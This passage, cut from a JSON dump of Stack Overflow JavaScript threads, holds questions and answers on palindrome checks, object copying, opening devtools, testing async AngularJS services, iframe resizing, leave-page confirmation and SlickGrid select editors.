palindrome.js\nMongoDB shell version: 2.4.8\nconnecting to: test\nisPalindrome(): true\nisPalindrome(a): true\nisPalindrome(ab): false\nisPalindrome(aa): true\nisPalindrome(aab): false\nisPalindrome(aba): true\nisPalindrome(aaa): true\nisPalindrome(abaa): false\nisPalindrome(neilarmstronggnortsmralien): true\nisPalindrome(neilarmstrongxgnortsmralien): true\nisPalindrome(neilarmstrongxsortsmralien): false\n</code></pre>\n\n<p>An iterative solution is:</p>\n\n<pre><code>function isPalindrome(s) {\n  var len = s.length;\n  if (len &lt; 2) {\n    return true;\n  }\n  var i = 0;\n  var j = len - 1;\n  while (i &lt; j) {\n    if (s[i] != s[j]) {\n      return false;\n    }\n    i += 1;\n    j -= 1;\n  }\n  return true;\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Note: This is case sensitive</p>\n\n<pre><code>function palindrome(word)\n{\n    for(var i=0;i&lt;word.length/2;i++)\n        if(word.charAt(i)!=word.charAt(word.length-(i+1)))\n            return word+\" is Not a Palindrome\";\n    return word+\" is Palindrome\";\n}\n</code></pre>\n\n<p>Here is the fiddle: <a href=\"http://jsfiddle.net/eJx4v/\" rel=\"nofollow\">http://jsfiddle.net/eJx4v/</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<pre><code>function palindrome(str) {\n    var lenMinusOne = str.length - 1;\n    var halfLen = Math.floor(str.length / 2);\n\n    for (var i = 0; i &lt; halfLen; ++i) {\n        if (str[i] != str[lenMinusOne - i]) {\n            return false;\n        }\n    }\n    return true;\n}\n</code></pre>\n\n<p>Optimized for half string parsing and for constant value variables.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>The most important thing to do when solving a Technical Test is <strong>Don't use shortcut methods</strong> -- <strong>they want to see how you think algorithmically! Not your use of methods.</strong></p>\n\n<p>Here is one that I came up with (45 minutes after I blew the test). There are a couple optimizations to make though. When writing any algorithm, its best to assume <code>false</code> and alter the logic if its looking to be <code>true</code>.</p>\n\n<p><strong><code>isPalindrome()</code>:</strong></p>\n\n<p>Basically, to make this run in <strong>O(N)</strong> (linear) complexity you want to have 2 <em>iterators</em> whose vectors point towards each other. Meaning, one iterator that starts at the beginning and one that starts at the end, each traveling inward. You could have the iterators traverse the whole array and use a condition to <code>break</code>/<code>return</code> once they meet in the middle, but it may save some work to only give each iterator a <em>half-length</em> by default.</p>\n\n<p><code>for</code> loops seem to force the use of more checks, so I used <code>while</code> loops - which I'm less comfortable with.</p>\n\n<p>Here's the code:</p>\n\n<pre><code>/**\n * TODO: If func counts out, let it return 0\n *  * Assume !isPalindrome (invert logic)\n */\nfunction isPalindrome(S){\n    var s = S\n      , len = s.length\n      , mid = len/2;\n      , i = 0, j = len-1;\n\n    while(i&lt;mid){\n        var l = s.charAt(i);\n        while(j&gt;=mid){\n            var r = s.charAt(j);\n            if(l === r){\n                console.log('@while *', i, l, '...', j, r);\n                --j;\n                break;\n            }\n            console.log('@while !', i, l, '...', j, r);\n            return 0;\n        }\n        ++i;\n    }\n    return 1;\n}\n\nvar nooe = solution('neveroddoreven');  // even char length\nvar kayak = solution('kayak');  // odd char length\nvar kayaks = solution('kayaks');\n\nconsole.log('@isPalindrome', nooe, kayak, kayaks);\n</code></pre>\n\n<p>Notice that if the loops count out, it returns <code>true</code>. All the logic should be inverted so that it by default returns <code>false</code>. I also used one short cut method <code>String.prototype.charAt(n)</code>, but I felt OK with this as every language natively supports this method.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I am not sure how this JSPerf check the code performance. I just tried to reverse the string &amp; check the values. Please comment about the Pros &amp; Cons of this method.</p>\n\n<pre><code>function palindrome(str) {\n    var re = str.split(''),\n        reArr = re.slice(0).reverse();\n\n    for (a = 0; a &lt; re.length; a++) {\n        if (re[a] == reArr[a]) {\n            return false;\n        } else {\n            return true;\n        }\n    }\n}\n</code></pre>\n\n<p><strong><a href=\"http://jsperf.com/test-palindrome\" rel=\"nofollow\">JS Perf test</a></strong></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I wonder how to write palindrome in javascript, where I input different words and program shows if word is palindrome or not. For example word noon is palindrome, while bad is not.</p>\n\n<p>Thank you in advance.</p>\n",
            "last_activity_date": 1415360725,
            "question_id": 22111507,
            "score": 9,
            "tags": [
                "javascript",
                "palindrome"
            ],
            "title": "How to write palindrome in JavaScript"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>I solved it myself for the time being. The original value has only 2 sub-properties. I reformed a new object with the properties from <code>a</code> and then assigned it to <code>b</code>. Now my event handler updates only <code>b</code>, and my original <code>a</code> stays as it is.</p>\n\n<pre><code>var a = { key1: 'value1', key2: 'value2' },\n    b = a;\n\n$('#revert').on('click', function(e){\n    //FAIL!\n    b = a;\n\n    //WIN\n    b = { key1: a.key1, key2: a.key2 };\n});\n</code></pre>\n\n<p>This works fine. I have not changed a single line anywhere in my code except for the above, and it works just how I wanted it to. So, trust me, nothing else was updating <code>a</code>.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>The reason for this is simple. JavaScript uses refereces, so when you assign <code>b = a</code> you are assigning a reference to <code>b</code> thus when updating <code>a</code> you are also updating <code>b</code></p>\n\n<p>I found <a href=\"http://stackoverflow.com/questions/728360/most-elegant-way-to-clone-a-javascript-object?page=1&amp;tab=votes#tab-top\">this</a> on stackoverflow and will help prevent things like this in the future by just calling this method if you want to do a deep copy of an object.</p>\n\n<pre><code>function clone(obj) {\n    // Handle the 3 simple types, and null or undefined\n    if (null == obj || \"object\" != typeof obj) return obj;\n\n    // Handle Date\n    if (obj instanceof Date) {\n        var copy = new Date();\n        copy.setTime(obj.getTime());\n        return copy;\n    }\n\n    // Handle Array\n    if (obj instanceof Array) {\n        var copy = [];\n        for (var i = 0, len = obj.length; i &lt; len; i++) {\n            copy[i] = clone(obj[i]);\n        }\n        return copy;\n    }\n\n    // Handle Object\n    if (obj instanceof Object) {\n        var copy = {};\n        for (var attr in obj) {\n            if (obj.hasOwnProperty(attr)) copy[attr] = clone(obj[attr]);\n        }\n        return copy;\n    }\n\n    throw new Error(\"Unable to copy obj! Its type isn't supported.\");\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>It's important to understand what the <code>=</code> operator in JavaScript does and does not do.</p>\n\n<p><strong>The <code>=</code> operator does not make a <em>copy</em> of the data.</strong></p>\n\n<p><strong>The <code>=</code> operator creates a new <em>reference</em> to the <em>same</em> data.</strong></p>\n\n<p>After you run your original code:</p>\n\n<pre><code>var a = $('#some_hidden_var').val(),\n    b = a;\n</code></pre>\n\n<p><code>a</code> and <code>b</code> are now two different names for <em>the same object</em>.</p>\n\n<p>Any change you make to the contents of this object will be seen identically whether you reference it through the <code>a</code> variable or the <code>b</code> variable. They are the same object.</p>\n\n<p>So, when you later try to \"revert\" <code>b</code> to the original <code>a</code> object with this code:</p>\n\n<pre><code>b = a;\n</code></pre>\n\n<p>The code actually does <em>nothing at all</em>, because <code>a</code> and <code>b</code> are the exact same thing. The code is the same as if you'd written:</p>\n\n<pre><code>b = b;\n</code></pre>\n\n<p>which obviously won't do anything.</p>\n\n<p>Why does your new code work?</p>\n\n<pre><code>b = { key1: a.key1, key2: a.key2 };\n</code></pre>\n\n<p>Here you are creating a brand new object with the <code>{...}</code> object literal. This new object is not the same as your old object. So you are now setting <code>b</code> as a reference to this new object, which does what you want.</p>\n\n<p>To handle any arbitrary object, you can use an object cloning function such as the one listed in Armand's answer, or since you're using jQuery just use the <a href=\"http://api.jquery.com/jQuery.extend/\"><code>$.extend()</code> function</a>. This function will make either a shallow copy or a deep copy of an object. (Don't confuse this with the <a href=\"http://api.jquery.com/clone/\"><code>$().clone()</code> method</a> which is for copying DOM elements, not objects.)</p>\n\n<p>For a shallow copy:</p>\n\n<pre><code>b = $.extend( {}, a );\n</code></pre>\n\n<p>Or a deep copy:</p>\n\n<pre><code>b = $.extend( true, {}, a );\n</code></pre>\n\n<p>What's the difference between a shallow copy and a deep copy? A shallow copy is similar to your code that creates a new object with an object literal. It creates a new top-level object containing references to the same properties as the original object.</p>\n\n<p>If your object contains only primitive types like numbers and strings, a deep copy and shallow copy will do exactly the same thing. But if your object contains other objects or arrays nested inside it, then a shallow copy doesn't <em>copy</em> those nested objects, it merely creates references to them. So you could have the same problem with nested objects that you had with your top-level object. For example, given this object:</p>\n\n<pre><code>var obj = {\n    w: 123,\n    x: {\n        y: 456,\n        z: 789\n    }\n};\n</code></pre>\n\n<p>If you do a shallow copy of that object, then the <code>x</code> property of your new object is the same <code>x</code> object from the original:</p>\n\n<pre><code>var copy = $.extend( {}, obj );\ncopy.w = 321;\ncopy.x.y = 654;\n</code></pre>\n\n<p>Now your objects will look like this:</p>\n\n<pre><code>// copy looks as expected\nvar copy = {\n    w: 321,\n    x: {\n        y: 654,\n        z: 789\n    }\n};\n\n// But changing copy.x.y also changed obj.x.y!\nvar obj = {\n    w: 123,  // changing copy.w didn't affect obj.w\n    x: {\n        y: 654,  // changing copy.x.y also changed obj.x.y\n        z: 789\n    }\n};\n</code></pre>\n\n<p>You can avoid this with a deep copy. The deep copy recurses into every nested object and array (and Date in Armand's code) to make copies of those objects in the same way it made a copy of the top-level object. So changing <code>copy.x.y</code> wouldn't affect <code>obj.x.y</code>.</p>\n\n<p>Short answer: If in doubt, you probably want a deep copy.</p>\n",
                    "is_accepted": true,
                    "score": 31
                },
                {
                    "body": "<p>the question is already solved since quite a long time, but for future reference a possible solution is</p>\n\n<pre><code>b = a.slice(0);\n</code></pre>\n\n<p>Be careful, this works correctly only if a is a non-nested array of numbers and strings</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I have a variable which has a JSON object as its value. I directly assign this variable to some other variable so that they share the same value. This is how it works:</p>\n\n<pre><code>var a = $('#some_hidden_var').val(),\n    b = a;\n</code></pre>\n\n<p>This works and both have the same value. I use a <code>mousemove</code> event handler to update <code>b</code> through out my app. On a button click, I want to revert <code>b</code> to the original value, meaning the value stored in <code>a</code>.</p>\n\n<pre><code>$('#revert').on('click', function(e){\n    b = a;\n});\n</code></pre>\n\n<p>After this if I use the same <code>mousemove</code> event handler, it updates both <code>a</code> and <code>b</code>, when earlier it was updating only <code>b</code> as expected.</p>\n\n<p>I'm stumped over this issue! What is wrong here?</p>\n",
            "last_activity_date": 1392312249,
            "question_id": 18829099,
            "score": 9,
            "tags": [
                "javascript"
            ],
            "title": "Copy a variable&#39;s value into another"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>You cannot directly use the Chrome's Dev Tools from your web pages. It is bundled with the browser.</p>\n\n<p>But you can use it like a regular web application. Go to Chrome Developer Tools, then go to <a href=\"https://developers.google.com/chrome-developer-tools/docs/contributing\">Contributing</a>. You will find help on using Dev Tools for your app.</p>\n\n<h3>Setting up</h3>\n\n<ul>\n<li>Install Chrome Canary on Mac OS / Windows or download the latest Chromium build from the Chromium continuous builds archive on Linux</li>\n<li>Clone Blink git repo from <a href=\"https://chromium.googlesource.com/chromium/blink.git\">https://chromium.googlesource.com/chromium/blink.git</a></li>\n<li>Set up a local web server that would serve files from WebKit/Source/WebCore/inspector on some port (8090)</li>\n</ul>\n\n<h3>Running</h3>\n\n<ul>\n<li>Run one copy of Chrome Canary with the following command line flags: --remote-debugging-port=9222 --user-data-dir=blink/chromeServerProfile --remote-debugging-frontend=\"http://localhost:8090/front_end/inspector.html\". These flags cause Chrome to allow websocket connections into localhost:9222 and to serve the front-end UI from your local git repo. (Adjust the path to chromeServerProfile to be some writable directory in your system).</li>\n<li>Open a sample page (eg www.chromium.org).</li>\n<li>Run a second copy of Chrome Canary with the command line flag: --user-data-dir=/work/chromeClientProfile. Open <code>http://localhost:9222</code>. Among the thumbnails you will see the sample page from the other browser instance. Click on it to start remote debugging your sample page.</li>\n<li>The DevTools web page that opens is served from the remote-debugging-frontend in the first browser instance, which serves from the git repo your local filesystem. Debug this Devtools Web page and edit its source like any other web app.</li>\n</ul>\n\n<p>I hope this is what you need.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>There's no way to control the web developer tool from an in-page script, other than through the <a href=\"http://getfirebug.com/wiki/index.php/Console_API\" rel=\"nofollow\">Console API</a> which provides mostly logging facilities. Letting scripts control more than that would be a serious security issue, since it would allow a web page to control parts of the browser.</p>\n\n<p>The only API remotely related to what you're trying to do is the <a href=\"https://developers.google.com/chrome-developer-tools/docs/console#setting_breakpoints_in_javascript\" rel=\"nofollow\"><code>debugger</code></a> command, which switches to the script pane only if the developer tools were already open.</p>\n\n<p>But who are you trying to develop this feature for?</p>\n\n<p>If it's for developers working on the site, then it's better to just use the existing developer tools manually, by setting breakpoints, or the <em>pause on exceptions</em> toggle.</p>\n\n<p>If it's for end users, <strong>don't</strong>. Unless your site is supposed to be used by highly technical web developers, you're only going to scare away users if the developer tools suddenly pop up with errors.</p>\n\n<p>If you really want to show errors you can implement your own logging framework and the UI for error reporting, which works with basic JS and doesn't depend on a specific browser environment.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>I don't know if borwser will allow a script to open a extension, as it may lead to insecurity, but I hope you may design the Add-On to do the same..</p>\n\n<p>Please refer this <a href=\"http://chrispederick.com/work/web-developer/\" rel=\"nofollow\"><code>link</code></a></p>\n\n<p>here you will Find an Extension/Add-on for Chrome and Firefox both, that is actually very good extension, you will not need any thing else in normal scenario..</p>\n\n<p>Install this add-on/Extension and tell me if you like, I am using it and some times it works better then the inbuilt..</p>\n\n<p>I hope this will help you in achieving your requirement..</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Simply: <em>You can't</em>.</p>\n\n<p>The Dev Tools are not sandboxed (unlike any web page), thus granting <strong>sandboxed</strong> environments the power to open and control an <strong>unsandboxed</strong> environment is a <strong>major security design flaw</strong>.</p>\n\n<p>I hope this answers your question :-)</p>\n",
                    "is_accepted": true,
                    "score": 7
                }
            ],
            "body": "<p>I'm looking for a way to open the WebKit \u201cdeveloper tools\u201d from a script attached to a web-page. I need solutions for both Google Chrome and Safari, that will open the developer-tools pane if it's not already open, and (hopefully, if you can figure out how) also switch to a particular tab/section of said pane upon opening.</p>\n\n<p>(Use-case, if anyone's interested: I want to open the <code>console.log</code> output-window if there's been an error and a developer is looking at the page; this particular page will be the output of some JavaScript unit-tests.)</p>\n\n<hr>\n\n<p>I'm setting a bounty on this question because it's obviously one that hasn't been answered to anyone's satisfaction before, and the answer is a hairy one. Please don't answer it unless you have a <em>real answer</em> that both: 1) works in <em>both browsers</em>, and 2) doesn't require private extension APIs that won't work from a static web-page.</p>\n\n<p>See (related, but specific to Chrome, and extensions): <a href=\"http://stackoverflow.com/questions/6801577/can-i-programmatically-open-the-devtools-from-a-google-chrome-extension\">Can I programmatically open the devtools from a Google Chrome extension?</a></p>\n",
            "last_activity_date": 1370328768,
            "question_id": 16660325,
            "score": 9,
            "tags": [
                "javascript",
                "google-chrome",
                "safari",
                "webkit",
                "developer-tools"
            ],
            "title": "Open Safari / Google Chrome developer tools programmatically from JavaScript"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>First of all, the <code>setTimeout</code> is particularly tricky to test since it hard to mock. Fortunately AngularJS has a wrapper around it (<code>$timeout</code>) that plays the same role but can be easily mocked:</p>\n\n<pre><code>  ls.DoIt = function() {\n    var deferred = $q.defer();\n\n    $timeout(function(){\n        deferred.resolve(5);\n    },3000);\n\n    return deferred.promise;\n  }\n</code></pre>\n\n<p>The mock provided for <code>$timeout</code> allows us to easily simulate elapsed time (with <code>$timeout.flush()</code>) which means our tests can run fast, without really waiting for the async event to complete (please note that the production code is still using async API!).</p>\n\n<p>The changed tests would look like:</p>\n\n<pre><code>it(\"should equal 5\",  inject(function(myservice, $timeout) {\n\n    var valueToVerify;\n    myservice.DoIt().then(function(returned) {\n      valueToVerify = returned;  \n    });  \n    $timeout.flush();        \n    expect(valueToVerify).toEqual(5);\n}));\n</code></pre>\n\n<p>And finally the working jsFiddle: <a href=\"http://jsfiddle.net/v9L9G/1/\" rel=\"nofollow\">http://jsfiddle.net/v9L9G/1/</a></p>\n",
                    "is_accepted": false,
                    "score": 19
                },
                {
                    "body": "<p>It's not related to Angular itself, but to <a href=\"http://pivotal.github.com/jasmine/#section-Asynchronous_Support\" rel=\"nofollow\">Jasmine async tests</a>.</p>\n\n<p>If you need a <code>setTimeout</code> use Angular <a href=\"http://docs.angularjs.org/api/ng.%24timeout\" rel=\"nofollow\"><code>$timeout</code></a>. And if you wish to have a fine control over setTimeout/$timeout executions, use <a href=\"http://pivotal.github.com/jasmine/#section-Mocking_the_JavaScript_Clock\" rel=\"nofollow\">mocked Clock</a>.</p>\n",
                    "is_accepted": false,
                    "score": 4
                }
            ],
            "body": "<p>I am trying to unit test a service which has asynchronous methods but am having no luck.</p>\n\n<p>I have tried to implement with promises by using the $q support in angularjs.</p>\n\n<p>Any help would be appreciated.</p>\n\n<p><a href=\"http://jsfiddle.net/9pBze/37/\">http://jsfiddle.net/9pBze/37/</a></p>\n\n<pre><code>angular.module('myapp', ['myservice']);\n\nangular.module('myservice', []).factory('myservice', function($q) {\n  var ls = {};\n\n  ls.DoIt = function() {\n    var deferred = $q.defer();\n\n    setTimeout(function(){\n        deferred.resolve(5);\n    },3000);\n\n    return deferred.promise;\n  }\n\n  return ls;\n\n});\n\ndescribe('services', function () {\n\n    beforeEach(module('myservice'));\n\n    it(\"should equal 2\",  inject(function(myservice) {\n        myservice.DoIt().then(function(returned) {\n            expect(returned).toEqual(2);\n        });        \n    }));\n});\n</code></pre>\n",
            "last_activity_date": 1425473391,
            "question_id": 15477370,
            "score": 9,
            "tags": [
                "javascript",
                "unit-testing",
                "asynchronous",
                "angularjs"
            ],
            "title": "Unit testing an asynchronous service in angularjs"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>For same-origin content like yours, <a href=\"http://stackoverflow.com/questions/5604839/accessing-an-element-outside-of-iframe\">yes you can</a>.</p>\n\n<p>To borrow from Gary's answer on the above question: </p>\n\n<blockquote>\n  <p>In the iframe, window.parent refers to the global object of the parent\n  document, not the document object itself. I believe you would need to\n  use parent.document.getElementById</p>\n</blockquote>\n\n<p>Try accessing the iframe using parent.document, and see if this solves your issue.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You can do this also without knowing the <code>id</code>of the <code>iframe</code> in the parent window:</p>\n\n<pre><code>window.frameElement.style.width = iframeContentWidth + 'px';\nwindow.frameElement.style.height = iframeContentHeight + 'px';\n</code></pre>\n\n<p>See <code>frameElement</code> at <a href=\"https://developer.mozilla.org/en-US/docs/DOM/window.frameElement\" rel=\"nofollow\">MDN</a>.</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>Just in case the <code>iframe</code> happens to be in a container element which has fixed size and <code>overflow: hidden</code> you can do something like this:</p>\n\n<pre><code>function resizeIframe (iframeContentWidth, iframeContentHeight) {\n    var container = window.frameElement.parentElement;\n    if (container != parent.document.body) {\n        container.style.width = iframeContentWidth + 'px';\n        container.style.height = iframeContentHeight + 'px';\n    }\n    window.frameElement.style.width = iframeContentWidth + 'px';\n    window.frameElement.style.height = iframeContentHeight + 'px';\n    return;\n}\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 7
                },
                {
                    "body": "<p>Assuming you have only 1 IFRAME in the main window, from the Javascript of the IFRAME's document you can do something like:</p>\n\n<pre><code>function getMySelf()\n{\n    return (window.parent.document.getElementsByTagName(\"iframe\"))[0];\n}\n\nvar myself = getMySelf();\nmyself.style.width = whateverWidth;\nmyself.style.height = whateverHeight;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Both main window and iframe are on the same domain, but what I want to achieve is to resize iframe to fit its contents using js only within that iframe.</p>\n\n<p>I also do not know the id of the iframe that is assigned to it by main window. And I do not want to use jquery or any other framework for it.</p>\n",
            "last_activity_date": 1344082478,
            "question_id": 11806947,
            "score": 9,
            "tags": [
                "javascript",
                "iframe",
                "resize",
                "no-framework"
            ],
            "title": "is it possible that iframe resize itself without help from main window?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Try this:</p>\n\n<pre><code>&lt;script&gt;\nwindow.onbeforeunload = function (e) {\n    e = e || window.event;\n\n    // For IE and Firefox prior to version 4\n    if (e) {\n        e.returnValue = 'Sure?';\n    }\n\n    // For Safari\n    return 'Sure?';\n};\n&lt;/script&gt;\n</code></pre>\n\n<p>Here is a working <a href=\"http://jsfiddle.net/gopi1410/yWs7P/\">jsFiddle</a></p>\n",
                    "is_accepted": true,
                    "score": 18
                },
                {
                    "body": "<p>throw this in your javascript where you want it to appear</p>\n\n<pre><code>window.onbeforeunload = \"Are you sure you want to leave?\";\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>How to ask confirmation from user before he leaves the page as in gmail?</p>\n\n<p>I searched for this question in various places, but all that they mention is the use of javascript <b>window.unload</b> &amp; <b>window.onbeforeunload</b>. Also it doesn't work in chrome most of the times as it gets blocked.<br/></p>\n",
            "last_activity_date": 1362727777,
            "question_id": 10311341,
            "score": 9,
            "tags": [
                "javascript",
                "html"
            ],
            "title": "Confirmation before closing of tab/browser"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>A similar queations was asked <a href=\"http://stackoverflow.com/questions/2623161/slickgrid-column-with-a-drop-down-select-list\">here</a> (this one is however not slickgrid tagged).</p>\n\n<p>I did make a SelectEditor, with a flexible range of options depending on the column we are in. The reason of thinking here is that the datatype of the value you edit in a column will determine the valid choices for this field.</p>\n\n<p>In order to do this you can add an extra option to your column definitions (e.g. called options) like this:</p>\n\n<pre><code> var columns = [\n  {id:\"color\", name:\"Color\", field:\"color\",  options: \"Red,Green,Blue,Black,White\", editor: SelectCellEditor}\n  {id:\"lock\", name:\"Lock\", field:\"lock\",  options: \"Locked,Unlocked\", editor: SelectCellEditor},\n</code></pre>\n\n<p>]</p>\n\n<p>and access that using <strong>args.column.options</strong> in the init method of your own SelectEditor object like this:</p>\n\n<pre><code> SelectCellEditor : function(args) {\n        var $select;\n        var defaultValue;\n        var scope = this;\n\n        this.init = function() {\n\n            if(args.column.options){\n              opt_values = args.column.options.split(',');\n            }else{\n              opt_values =\"yes,no\".split(',');\n            }\n            option_str = \"\"\n            for( i in opt_values ){\n              v = opt_values[i];\n              option_str += \"&lt;OPTION value='\"+v+\"'&gt;\"+v+\"&lt;/OPTION&gt;\";\n            }\n            $select = $(\"&lt;SELECT tabIndex='0' class='editor-select'&gt;\"+ option_str +\"&lt;/SELECT&gt;\");\n            $select.appendTo(args.container);\n            $select.focus();\n        };\n\n        this.destroy = function() {\n            $select.remove();\n        };\n\n        this.focus = function() {\n            $select.focus();\n        };\n\n        this.loadValue = function(item) {\n            defaultValue = item[args.column.field];\n            $select.val(defaultValue);\n        };\n\n        this.serializeValue = function() {\n            if(args.column.options){\n              return $select.val();\n            }else{\n              return ($select.val() == \"yes\");\n            }\n        };\n\n        this.applyValue = function(item,state) {\n            item[args.column.field] = state;\n        };\n\n        this.isValueChanged = function() {\n            return ($select.val() != defaultValue);\n        };\n\n        this.validate = function() {\n            return {\n                valid: true,\n                msg: null\n            };\n        };\n\n        this.init();\n    }\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 15
                },
                {
                    "body": "<p>You can slightly modify the above SelectCellEditor to create different select options for each cell.</p>\n\n<pre><code>function SelectCellEditor(args) {\n\n   .....\n\n   // just to get the DOM element\n   this.getInputEl = function() {\n      return $input;\n   };\n}\n</code></pre>\n\n<p>Now it is easy to create a dynamic dropdown editor.</p>\n\n<pre><code>function DynamicSelectCellEditor(args) {\n   // 1: if you already have a select list for individual cells\n   args.columns.options = optionsList[args.item.id] // or any custom logic\n   return new Slick.Editors.SelectCellEditor(args);\n\n   /*              OR                */\n\n   // 2: if data needs to be fetched from the server\n   var editor = new Slick.Editors.SelectCellEditor(args),\n       $select = editor.getInputEl();\n\n   $select.html(\"&lt;option&gt;Loading...&lt;/option&gt;\");\n   $.ajax({ }).done(function(list) {\n       // Update select list\n       $select.html(newHtml);\n   });\n\n   return editor;\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>replace </p>\n\n<pre><code>for( i in opt_values ){\n          v = opt_values[i];\n          option_str += \"&lt;OPTION value='\"+v+\"'&gt;\"+v+\"&lt;/OPTION&gt;\";\n}\n</code></pre>\n\n<p>with </p>\n\n<pre><code>$.each(opt_values , function( index, value ) {\n    option_str += \"&lt;OPTION value='\"+value+\"'&gt;\"+value+\"&lt;/OPTION&gt;\";\n});\n</code></pre>\n\n<p>if it is not working for you</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Please try the below code.</p>\n\n<p>In slick.editors.js,Define a new editor.</p>\n\n<pre><code>$.extend(true, window, {\n    \"Slick\": {\n      \"Editors\": {\n       \"SelectOption\": SelectCellEditor,\n       .....\n      }\n    }\n  });\nfunction SelectCellEditor(args) {\n    var $select;\n    var defaultValue;\n    var scope = this;\n    var s;\n    this.init = function() {\n        opt_values = eval(args.column.options);\n        option_str = \"\";\n        var tuples = [];\n        for (var key in opt_values) tuples.push([key, opt_values[key]]);\n        tuples.sort(function(a, b) { return a[1] &lt; b[1] ? 1 : a[1] &gt; b[1] ? -1 : 0 });\n        var length = tuples.length;\n        while (length--) option_str += \"&lt;OPTION value='\"+tuples[length][0]+\"'&gt;\"+tuples[length][1]+\"&lt;/OPTION&gt;\";\n\n        $select = $(\"&lt;SELECT tabIndex='0' class='editor-select'&gt;\"+ option_str +\"&lt;/SELECT&gt;\");\n        $select.appendTo(args.container);\n        $select.focus();\n    };\n\n    this.destroy = function() {\n        $select.remove();\n    };\n\n    this.focus = function() {\n        $select.focus();\n    };\n\n    this.loadValue = function(item) {\n        defaultValue = item[args.column.field];\n        $select.val(defaultValue);\n    };\n\n    this.serializeValue = function() {\n          return $select.val();\n    };\n\n    this.applyValue = function(item,selectedIndex) {\n        if($.isNumeric(selectedIndex))\n            item[args.column.field] = parseInt(selectedIndex);\n        else\n            item[args.column.field] = selectedIndex;\n    };\n\n    this.isValueChanged = function() {\n        return ($select.val() != defaultValue);\n    };\n\n    this.validate = function() {\n        return {\n            valid: true,\n            msg: null\n        };\n    };\n\n    this.init();\n}\n</code></pre>\n\n<p>Then, modify your grid options</p>\n\n<pre><code>var grid_options = {\neditable:             true,\nenableAddRow:       false,\nmultiColumnSort:    true,\nexplicitInitialization: true,\n dataItemColumnValueExtractor: function(item, columnDef) {\n if(columnDef.editor == Slick.Editors.SelectOption){\n    return eval(columnDef.options)[item[columnDef.field]];\n  }else{\n    return item[columnDef.field];\n  }\n}\n</code></pre>\n\n<p>};</p>\n\n<p>And use the editor while columns initialization.</p>\n\n<pre><code>{id: \"currency_id\", name: \"Currency *\", field: \"currency_id\", editor: Slick.Editors.SelectOption, options: { 1: 'Dollar', 2: 'Yen', 3: 'Rupiah' }, sortable: true,width: 234}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I can't add comments yet, but I need to add something to HeiN's answer.</p>\n\n<p>HeiN's answer works great, but I have data coming in that does not match my select options and I need to still display that data... so I have had to modify             dataItemColumnValueExtractor in the options. This allows my original data to display if I do not have an option in the list to match.</p>\n\n<pre><code>        dataItemColumnValueExtractor: function(item, columnDef) {\n            if(columnDef.editor == Slick.Editors.SelectOption){\n                return eval(columnDef.options)[item[columnDef.field]] != null ? eval(columnDef.options)[item[columnDef.field]] : item[columnDef.field];\n            }else{\n                return item[columnDef.field];\n            }\n        }\n</code></pre>\n\n<p>Hope this helps somebody later down the line.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I want to make a dynamically populated html select for a select cell. I extract some information from a database which is different for every row item. The problem is that the editor loses the initial data and I don't know how to keep some data for a specific cell. Has someone done this before?</p>\n\n<pre><code>function StandardSelectCellEditor($container, columnDef, value, dataContext) {\nvar $input;\nvar $select;\nvar defaultValue = value;\nvar scope = this;\n\nthis.init = function() {\n    $input = $(\"&lt;INPUT type=hidden /&gt;\");\n    $input.val(value); \n    }\n\n    $input.appendTo($container);\n\n    $select = $(\"&lt;SELECT tabIndex='0' class='editor-yesno'&gt;\");\n    jQuery.each(value, function() {\n      $select.append(\"&lt;OPTION value='\" + this + \"'&gt;\" + this + \"&lt;/OPTION&gt;&lt;/SELECT&gt;\");\n    });\n    $select.append(\"&lt;/SELECT&gt;\");\n\n    $select.appendTo($container);\n\n    $select.focus();\n};\n\n\nthis.destroy = function() {\n    //$input.remove();\n    $select.remove();\n};\n\n\nthis.focus = function() {\n    $select.focus();\n};\n\nthis.setValue = function(value) {\n    $select.val(value);\n    defaultValue = value;\n};\n\nthis.getValue = function() {\n    return $select.val();\n};\n\nthis.isValueChanged = function() {\n    return ($select.val() != defaultValue);\n};\n\nthis.validate = function() {\n    return {\n        valid: true,\n        msg: null\n    };\n};\n\nthis.init();\n};\n</code></pre>\n",
            "last_activity_date": 1425586653,
            "question_id": 3211956,
            "score": 9,
            "tags": [
                "javascript",
                "jquery",
                "slickgrid"
            ],
            "title": "SlickGrid select editor"
        },
        {
            "answer_count": 11,
            "answers": [
                {
